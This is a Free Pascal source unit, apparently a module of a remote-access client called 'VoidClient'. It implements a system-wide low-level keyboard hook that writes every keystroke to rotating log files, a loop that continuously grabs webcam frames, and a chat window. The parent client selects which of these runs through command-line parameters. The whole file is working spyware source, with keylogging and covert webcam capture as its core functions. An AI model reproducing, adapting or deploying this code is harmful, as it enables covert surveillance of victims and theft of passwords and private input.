unit ChatUnit;
{
     This is the Graphical/High level part of VoidClient.
     This was the result of a bad decision, it should have been
     integrated into the main Client instead of being a separate module.
     When you use one of the modules contained in ChatUnit (eg. Chat or Keylogger),
     you'll have to wait a bit, because Chat is always extracted dynamically.
}

{$mode delphi}{$H+}

interface

uses
  Windows, Classes, SysUtils, FileUtil, Forms, Controls, Graphics, Dialogs, StdCtrls;

type

  { TChatForm }

  TKeyLogger = class(TThread)
  private
    FAllow: Boolean;
    FDir: String;
    FMaxLogSize: Int64;
  public
    property LogDirectory: String read FDir write FDir;
    property MaxLogSize: Int64 read FMaxLogSize write FMaxLogSize;
    property Allow: Boolean read FAllow write FAllow;
    procedure Execute; override;
  end;

  TSpeaker = class(TThread)
  public
    procedure Execute; override;
  end;

  TSeer = class(TThread)
  public
    procedure Execute; override;
  end;

  TChatForm = class(TForm)
    MessageEdit: TEdit;
    ChatLog: TMemo;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
  private

  public

  end;

var
  ChatForm: TChatForm;
  MyName: String;
  Speaker: TSpeaker;
  WebCam: HWND;
  Seer: TSeer;

Function capCreateCaptureWindowA(lpszWindowName: String; dwStyle: Integer; X: Integer; Y: Integer;
  nWidth: Integer; nHeight: Integer; hwndParent: HWND; nID : Integer): Integer; stdcall;
  external 'avicap32.dll';

const
  WM_CAP_DRIVER_CONNECT           = WM_USER + 10;
  WM_CAP_DRIVER_DISCONNECT        = WM_USER + 11;
  WM_CAP_GRAB_FRAME               = WM_USER + 60;
  WM_CAP_EDIT_COPY                = WM_USER + 30;
  WM_CAP_SET_PREVIEW              = WM_USER + 50;
  WM_CAP_FILE_SAVEASA             = WM_USER + 23;

implementation

function ToUnicodeEx(wVirtKey, wScanCode: UINT; lpKeyState: PByte;  pwszBuff: PWideChar; cchBuff: Integer;
  wFlags: UINT; dwhkl: HKL): Integer; stdcall; external 'user32.dll';

const
  LLKHF_ALTDOWN = KF_ALTDOWN shr 8;
  WH_KEYBOARD_LL = 13;

type
  PKBDLLHOOKSTRUCT = ^TKBDLLHOOKSTRUCT;
  TKBDLLHOOKSTRUCT = packed record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: DWORD;
  end;

var
  llKeyboardHook: HHOOK = 0;
  AltDown, ShiftDown, CtrlDown, WinDown: Boolean;
  KeyBoardState: TKeyboardState;
  KeyBoardLayOut: HKL;
  MrHook: HHook;
  FFile: Text;
  CurrentLogSize: Int64;
  CurrentLogName: String;
  LogAgent: TKeyLogger;

{$R *.lfm}

{ TChatForm }

function FileSize(fileName : wideString) : Int64;
var
  sr : TSearchRec;
begin
  if FindFirst(fileName, faAnyFile, sr ) = 0 then
     result := Int64(sr.FindData.nFileSizeHigh) shl Int64(32) + Int64(sr.FindData.nFileSizeLow)
  else
     result := -1;
  FindClose(sr);
end;

function GetDate: String;
var myDate: TDateTime;
    X: String;
Begin
 myDate:=Now;
 X:=DateTimeToStr(myDate);
 X:=StringReplace(X,'/','_',[rfReplaceAll,rfIgnoreCase]);
 X:=StringReplace(X,' ','-',[rfReplaceAll,rfIgnoreCase]);
 X:=StringReplace(X,':','_',[rfReplaceAll,rfIgnoreCase]);
 GetDate:=X;
end;

procedure TKeyLogger.Execute;
Begin
 CurrentLogName:=IncludeTrailingPathDelimiter(FDir)+GetDate+'.xyz';
 Repeat
   CurrentLogSize:=FileSize(CurrentLogName);
   if CurrentLogSize>=FMaxLogSize then Begin
     CurrentLogName:=IncludeTrailingPathDelimiter(FDir)+GetDate+'.xyz';
   end;
 until Not(FAllow);
end;

function LowLevelKeyboardHook(nCode: Integer; wParam: WPARAM; lParam: LPARAM): HRESULT; stdcall;
var
  pkbhs: PKBDLLHOOKSTRUCT;
  AChr: array[0..1] of WideChar;
  VirtualKey: integer;
  ScanCode: integer;
  ConvRes: integer;
  ActiveWindow: HWND;
  ActiveThreadID: DWord;
  Str: widestring;
begin
  pkbhs := PKBDLLHOOKSTRUCT({%H-}Pointer(lParam));
  if nCode = HC_ACTION then
  begin
    VirtualKey := pkbhs^.vkCode;
    Str := '';
    if LongBool(pkbhs^.flags and LLKHF_ALTDOWN) and (not AltDown) then
    begin
      Str := '[Alt]';
      AltDown := True;
    end;
    if (not LongBool(pkbhs^.flags and LLKHF_ALTDOWN)) and (AltDown) then
      AltDown := False;

    if (WordBool(GetAsyncKeyState(VK_CONTROL) and $8000)) and (not CtrlDown) then
    begin
      Str := '[Ctrl]';
      CtrlDown := True;
    end;
    if (not WordBool(GetAsyncKeyState(VK_CONTROL) and $8000)) and (CtrlDown) then
      CtrlDown := False;

    if ((VirtualKey = VK_LSHIFT) or (VirtualKey = VK_RSHIFT)) and (not ShiftDown) then
    begin
      Str := '[Shift]';
      ShiftDown := True;
    end;
    if (wParam = WM_KEYUP) and ((VirtualKey = VK_LSHIFT) or (VirtualKey = VK_RSHIFT)) then
      ShiftDown := False;

    if ((VirtualKey = VK_LWIN) or (VirtualKey = VK_RWIN)) and (not WinDown) then
    begin
      Str := '[Win]';
      WinDown := True;
    end;
    if (wParam = WM_KEYUP) and ((VirtualKey = VK_LWIN) or (VirtualKey = VK_RWIN)) then
      WinDown := False;

    if (wParam = WM_KEYDOWN) and
          ((VirtualKey <> VK_LMENU) and (VirtualKey <> VK_RMENU)) and  //not Alt
           (VirtualKey <> VK_LSHIFT) and (VirtualKey <> VK_RSHIFT) and // not Shift
            (VirtualKey <> VK_LCONTROL) and (VirtualKey <> VK_RCONTROL) and //not Ctrl
            (VirtualKey <> VK_LWIN) and (VirtualKey <> VK_RWIN) then //not Winkey
    begin
      Str := chr(VirtualKey);
      if Str = '' then
      begin
        ActiveWindow := GetForegroundWindow;
        ActiveThreadID := GetWindowThreadProcessId(ActiveWindow, nil);
        GetKeyboardState(KeyBoardState);
        KeyBoardLayOut := GetKeyboardLayout(ActiveThreadID);
        ScanCode := MapVirtualKeyEx(VirtualKey, 0, KeyBoardLayOut);
        if ScanCode <> 0 then
        begin
          ConvRes := ToUnicodeEx(VirtualKey, ScanCode, @KeyBoardState, @AChr, SizeOf(Achr), 0, KeyBoardLayOut);
          if ConvRes > 0 then
            Str := AChr;
        end;
      end;
    end;
    Str:=UTF8Encode(Str);
    if (Not(ShiftDown)) and (Pos('[',Str)=0) then Str:=LowerCase(Str);
    AssignFile(FFile,CurrentLogName);
    if Not(FileExists(CurrentLogName)) then Rewrite(FFile) else Append(FFile);
      Write(FFile,Str);
    CloseFile(FFile);
  end;
  Result := CallNextHookEx(llKeyboardHook, nCode, wParam, lParam);
end;

procedure TChatForm.FormCreate(Sender: TObject);
begin
  if ParamStr(1)='chat' then Begin
   Speaker:=TSpeaker.Create(False);
   MyName:=ParamStr(2);
  end else if ParamStr(1)='cam' then Begin
   WebCam:=capCreateCaptureWindowA('Wind',WS_VISIBLE or WS_CHILD,0,0,640,480,ChatForm.Handle,0);
   SendMessage(WebCam, WM_CAP_DRIVER_CONNECT, 0, 0);
   SendMessage(WebCam, WM_CAP_SET_PREVIEW, 1, 0);
   Seer:=TSeer.Create(False);
  end else Begin
    MrHook:=SetWindowsHookEx(wh_keyboard_ll, @LowLevelKeyboardHook, hInstance, 0);
    LogAgent:=TKeyLogger.Create(True);
    LogAgent.Allow:=True;
    if Not(DirectoryExists(ParamStr(2))) then MkDir(ParamStr(2));
    LogAgent.FDir:=ParamStr(2);
    LogAgent.MaxLogSize:=StrToInt(ParamStr(3));
    LogAgent.Start;
  end;
end;

procedure TChatForm.FormDestroy(Sender: TObject);
begin
  if ParamStr(1)='chat' then
   Speaker.Free else if ParamStr(1)='cam' then Begin
   SendMessage(WebCam, WM_CAP_DRIVER_DISCONNECT, 0, 0);
   Sleep(100);
   WebCam:=0;
  end else Begin
   UnhookWindowsHookEx(MrHook);
   LogAgent.Allow:=False;
   Sleep(100);
   LogAgent.Free;
  end;
end;

procedure TChatForm.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState
  );
begin
  if (Key=13) and Not(ssShift in Shift) then Begin
    Key:=0;
    MessageEdit.Text:=StringReplace(MessageEdit.Text,sLineBreak,'',[rfReplaceAll, rfIgnoreCase]);
    Write(MyName+': '+MessageEdit.Text);
    ChatLog.Lines.Add(MyName+': '+MessageEdit.Text);
    MessageEdit.Text:='';
  end;
end;

procedure TSpeaker.Execute;
var Msg: String;
Begin
  Repeat
    Readln(Msg);
    ChatForm.ChatLog.Lines.Add(Msg);
  until False;
end;

procedure TSeer.Execute;
Begin
 Repeat
   SendMessage(WebCam, WM_CAP_GRAB_FRAME, 0, 0);
   SendMessage(WebCam, WM_CAP_EDIT_COPY, 0, 0);
  // Sleep(1);
 until False;
end;

end.

